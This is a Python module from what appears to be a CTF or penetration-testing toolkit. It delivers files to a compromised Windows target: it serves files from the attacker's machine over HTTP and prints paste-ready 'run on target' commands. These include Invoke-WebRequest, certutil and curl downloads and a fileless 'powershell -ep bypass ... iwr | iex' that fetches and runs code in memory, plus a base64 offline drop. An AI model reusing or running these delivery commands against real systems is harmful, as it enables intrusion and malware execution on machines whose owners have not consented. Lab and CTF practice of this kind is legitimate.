import base64
import http.server
import os
import socket
import socketserver
import threading
from pathlib import Path

from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from rich.text import Text
from rich import box

from core.attacker import resolve_lhost

console = Console()

# =========================================================
# COLORS
# =========================================================

G = '\033[92m'
C = '\033[96m'
B = '\033[94m'
Y = '\033[93m'
R = '\033[91m'
W = '\033[0m'
M = '\033[35m'
W_BOLD = '\033[1m'

#
# Fixed, always-writable-by-default staging directory. Using a constant
# path (instead of relative-to-CWD downloads) kills the whole class of
# "where did the file actually land" bugs across every exploit module.
#
DEFAULT_REMOTE_DIR = r"C:\Users\Public\Uploads"

# =========================================================
# HELPERS
# =========================================================

def _human_size(num_bytes):

    size = float(num_bytes)

    for unit in ("B", "KB", "MB", "GB"):

        if size < 1024:
            return f"{size:.0f} {unit}" if unit == "B" else f"{size:.1f} {unit}"

        size /= 1024

    return f"{size:.1f} TB"


def _manifest_table(files):

    table = Table(
        box=None,
        show_header=True,
        header_style="bold cyan",
        pad_edge=False,
        expand=False,
    )

    table.add_column("File", style="white")
    table.add_column("Size", justify="right", style="white")

    total = 0

    for filepath in files:

        size = Path(filepath).stat().st_size
        total += size

        table.add_row(Path(filepath).name, _human_size(size))

    table.add_section()

    table.add_row(
        f"[bold cyan]{len(files)} file(s)[/bold cyan]",
        f"[bold cyan]{_human_size(total)}[/bold cyan]",
    )

    return table


def _print_script(lines, title):

    #
    # Deliberately no box here — a bordered panel means every line carries
    # a leading "│", and a drag-select to copy straight off the terminal
    # (no clipboard access, SSH session, etc.) would grab that too. A rule
    # frames it without ever touching the actual command text.
    #
    console.print()
    console.rule(f"[bold yellow]▸ {title}[/bold yellow]", style="yellow", align="left")
    console.print()

    for line in lines:
        console.print(f"[bold yellow]{line}[/bold yellow]", soft_wrap=True, highlight=False)

    console.print()


def _print_alternatives(example):

    console.rule("[dim]other delivery methods[/dim]", style="grey50", align="left")
    console.print()

    for label, key in (("certutil", "certutil"), ("curl", "curl")):

        line = Text()
        line.append(f"{label:<10}", style="dim cyan")
        line.append(example[key], style="yellow")

        console.print(line, soft_wrap=True, highlight=False)

    console.print()


def copy_clipboard(text):

    try:

        import pyperclip

        pyperclip.copy(text)

        return True

    except Exception:

        return False


# =========================================================
# COMMAND BUILDERS
# =========================================================

def build_http_commands(
    ip,
    port,
    filename,
    remote_dir=None,
):

    if remote_dir:

        remote_path = (
            f"{remote_dir}\\{filename}"
        )

    else:

        remote_path = (
            f".\\\\{filename}"
        )

    ps1 = (
        f"(New-Object Net.WebClient).DownloadFile("
        f"'http://{ip}:{port}/{filename}',"
        f"'{remote_path}')"
    )

    iwr = (
        f"Invoke-WebRequest "
        f"http://{ip}:{port}/{filename} "
        f"-OutFile \"{remote_path}\""
    )

    certutil = (
        f"certutil -urlcache -f "
        f"http://{ip}:{port}/{filename} "
        f"\"{remote_path}\""
    )

    curl = (
        f"curl http://{ip}:{port}/{filename} "
        f"-o \"{remote_path}\""
    )

    return {
        "powershell": ps1,
        "iwr": iwr,
        "certutil": certutil,
        "curl": curl,
    }


def build_fileless_command(ip, port, filename):

    return (
        f"powershell -ep bypass -nop -c "
        f"\"iwr http://{ip}:{port}/{filename} | iex\""
    )


def build_offline_command(filepath, remote_dir=None):

    data = Path(filepath).read_bytes()

    encoded = base64.b64encode(data).decode()

    filename = Path(filepath).name

    dest = (
        f"(Join-Path '{remote_dir}' '{filename}')"
        if remote_dir else
        f"(Join-Path (Get-Location).Path '{filename}')"
    )

    return (
        f"$b64='{encoded}'; "
        f"[IO.File]::WriteAllBytes("
        f"{dest}, "
        f"[Convert]::FromBase64String($b64)"
        f")"
    )


# =========================================================
# HTTP SERVER
# =========================================================

def serve_http(directory, port=8080):

    directory = Path(directory).resolve()

    os.chdir(directory)

    handler = http.server.SimpleHTTPRequestHandler

    class ReusableTCPServer(socketserver.TCPServer):
        allow_reuse_address = True

    httpd = ReusableTCPServer(
        ("0.0.0.0", port),
        handler
    )

    thread = threading.Thread(
        target=httpd.serve_forever,
        daemon=True
    )

    thread.start()

    return httpd


# =========================================================
# MODES
# =========================================================

def mode_http(
    files,
    ip,
    port,
    remote_dir=None,
):
    console.print()

    console.print(
        Panel(
            _manifest_table(files),
            title="[bold white]HTTP DELIVERY[/bold white]",
            title_align="left",
            border_style="cyan",
            box=box.ROUNDED,
            padding=(1, 2),
        )
    )

    #
    # Build the one paste-ready PowerShell script — mkdir, download each
    # file, then cd into place so whatever comes next just works.
    #
    script_lines = []

    if remote_dir:
        script_lines.append(f'New-Item -ItemType Directory -Force -Path "{remote_dir}" | Out-Null')

    per_file_cmds = {}

    for filepath in files:

        filename = Path(filepath).name

        cmds = build_http_commands(ip, port, filename, remote_dir)

        per_file_cmds[filename] = cmds

        script_lines.append(cmds["iwr"])

    if remote_dir:
        script_lines.append(f'cd "{remote_dir}"')

    _print_script(script_lines, "RUN ON TARGET — PowerShell")

    copy_clipboard("\n".join(script_lines))

    console.print("[green]→ copied to clipboard[/green]")
    console.print()

    #
    # Alternatives shown once (not per file) — same pattern, swap the URL/path
    #
    _print_alternatives(per_file_cmds[Path(files[0]).name])

    console.print(f"[yellow][*] Serving {len(files)} file(s) at http://{ip}:{port}/[/yellow]", highlight=False)

    return serve_http(Path(files[0]).parent, port)


def mode_fileless(filepath, ip, port):

    filename = Path(filepath).name
    size = _human_size(Path(filepath).stat().st_size)

    cmd = build_fileless_command(ip, port, filename)

    console.print()
    console.print(
        f"[bold white]FILELESS DELIVERY[/bold white]  "
        f"[dim]{filename} · {size} · nothing ever touches disk[/dim]",
        highlight=False,
    )

    _print_script([cmd], "RUN ON TARGET — PowerShell")

    copy_clipboard(cmd)

    console.print("[green]→ copied to clipboard[/green]")
    console.print()

    console.print(f"[yellow][*] Serving {filename} at http://{ip}:{port}/[/yellow]", highlight=False)

    return serve_http(
        Path(filepath).parent,
        port,
    )


def mode_offline(files, remote_dir=None):

    console.print()

    console.print(
        Panel(
            _manifest_table(files),
            title="[bold white]OFFLINE DELIVERY[/bold white]",
            title_align="left",
            border_style="cyan",
            box=box.ROUNDED,
            padding=(1, 2),
        )
    )

    script_lines = []

    if remote_dir:
        script_lines.append(f'New-Item -ItemType Directory -Force -Path "{remote_dir}" | Out-Null')

    for filepath in files:
        script_lines.append(build_offline_command(filepath, remote_dir))

    if remote_dir:
        script_lines.append(f'cd "{remote_dir}"')

    _print_script(script_lines, "RUN ON TARGET — PowerShell, one file at a time")

    copy_clipboard("\n\n".join(script_lines))

    console.print("[green]→ copied to clipboard[/green]")


# =========================================================
# MENU
# =========================================================

def choose_mode():

    table = Table(box=None, show_header=False, pad_edge=False, padding=(0, 2, 0, 0))
    table.add_column(style="bold cyan", no_wrap=True)
    table.add_column(style="white")
    table.add_column(style="dim")

    table.add_row("[1] HTTP", "web server", "fastest, needs a listener port")
    table.add_row("[2] Fileless", "in-memory", "nothing ever touches disk")
    table.add_row("[3] Offline", "base64 paste", "no network in/out at all")

    console.print()
    console.print(
        Panel(
            table,
            title="[bold white]WINDOWS FILE DELIVERY[/bold white]",
            title_align="left",
            border_style="blue",
            box=box.ROUNDED,
            padding=(1, 2),
        )
    )

    choice = input(f"\n{B}select> {W}").strip()

    mapping = {
        "1": "http",
        "2": "fileless",
        "3": "offline",
    }

    return mapping.get(choice)


# =========================================================
# PUBLIC API
# =========================================================

def stage_windows_files(
    files,
    data=None,
    method=None,
    ip=None,
    port=8080,
    remote_dir=None,
):

    if remote_dir is None:
        remote_dir = DEFAULT_REMOTE_DIR

    files = [
        Path(f).resolve()
        for f in files
    ]

    for filepath in files:

        if not filepath.exists():

            print(
                f"\n{R}[!] File not found:{W}"
            )

            print(f"  {filepath}")

            return

    if not ip:
        ip = resolve_lhost(args=None, data=data)

    if not method:
        method = choose_mode()

    if not method:
        return

    # =====================================================
    # HTTP
    # =====================================================

    if method == "http":

        server = mode_http(
            files,
            ip,
            port,
            remote_dir,
        )

        try:
            input("\nPress ENTER to stop server...\n")
        finally:
            server.shutdown()

    # =====================================================
    # FILELESS
    # =====================================================

    elif method == "fileless":

        if len(files) > 1:

            print(
                f"\n{R}[!] "
                f"Fileless mode only supports one file.{W}"
            )

            return

        server = mode_fileless(
            files[0],
            ip,
            port,
        )

        try:
            input("\nPress ENTER to stop server...\n")
        finally:
            server.shutdown()

    # =====================================================
    # OFFLINE
    # =====================================================

    elif method == "offline":

        mode_offline(files, remote_dir)


# =========================================================
# BACKWARD COMPAT
# =========================================================

def stage_windows_file(
    filepath,
    data=None,
    method=None,
    ip=None,
    port=8080,
    remote_dir=None,
):

    return stage_windows_files(
    [filepath],
    data=data,
    method=method,
    ip=ip,
    port=port,
    remote_dir=remote_dir,
)


# =========================================================
# CLI
# =========================================================

def run(data=None, cred=None, args=None):

    files = []

    # =====================================================
    # MULTI FILE
    # =====================================================

    arg_files = getattr(args, "files", None)

    if arg_files:

        if isinstance(arg_files, str):

            files.append(arg_files)

        else:

            files.extend(arg_files)

    # =====================================================
    # SINGLE FILE
    # =====================================================

    arg_file = getattr(args, "file", None)

    if arg_file:

        files.append(arg_file)

    # =====================================================
    # FAIL
    # =====================================================

    if not files:

        print(
            f"\n{R}[!] Usage:{W} "
            f"ctf dropw <file1> [file2] [file3]"
        )

        return data

    # =====================================================
    # DEDUP
    # =====================================================

    files = list(dict.fromkeys(files))

    # =====================================================
    # STAGE
    # =====================================================

    stage_windows_files(
        files,
        data=data,
    )

    return data